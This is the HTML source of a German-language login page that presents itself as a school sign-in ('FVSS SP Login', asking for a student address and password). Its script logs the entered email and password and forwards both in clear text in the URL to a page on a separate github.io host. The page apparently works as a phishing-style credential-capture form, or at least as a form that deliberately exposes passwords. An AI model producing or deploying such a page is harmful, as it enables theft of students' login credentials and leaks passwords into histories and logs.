
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FVSS SP Login</title>
    <link rel="icon" type="image/png" href="OIP.jpg">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(to bottom right, #f3f4f6, #dfe3e6);
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            max-width: 350px;
            text-align: center;
        }
        .login-container h1 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
        }
        .btn {
            display: inline-block;
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 1em;
            cursor: pointer;
        }
        .btn:disabled {
            background-color: #cccccc;
        }
        .secondary-btn {
            background-color: #f3f4f6;
            color: #333;
        }
        .link {
            font-size: 0.9em;
            color: #0078d4;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="IMG_0190.webp" alt="Logo" style="width: 150px;">
        <h1>Anmelden</h1>
        <form id="loginForm" action="https://db-sites.github.io/Schule4.0/eingeloggt" method="GET" onsubmit="return handleSubmit(event)">
            <input type="text" id="email" class="input-field" placeholder="Schueler Adresse" name="email" required>
            <input type="password" id="password" class="input-field" placeholder="Passwort">
            <div>
                <button type="button" class="btn secondary-btn" onclick="window.history.back();">Zurück</button>
                <button type="submit" class="btn">Weiter</button>
            </div>
        </form>
        <div>
            <p><a href="kkfvss" class="link">Keinen User? Erstellen Sie jetzt ein!</a></p>
            <p><a href="kcfvss" class="link">Sie können nicht auf Ihren Code zugreifen?</a></p>
        </div>
    </div>
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Verhindert den Standard-Submit

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const formAction = event.target.action;

            // Loggen der eingegebenen Daten und URL
            console.log("E-Mail:", email);
            console.log("Passwort:", password);
            console.log("URL:", formAction);

            // Weiterleiten zur Ziel-URL
            window.location.href = `${formAction}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
        }
    </script>
</body>
</html>
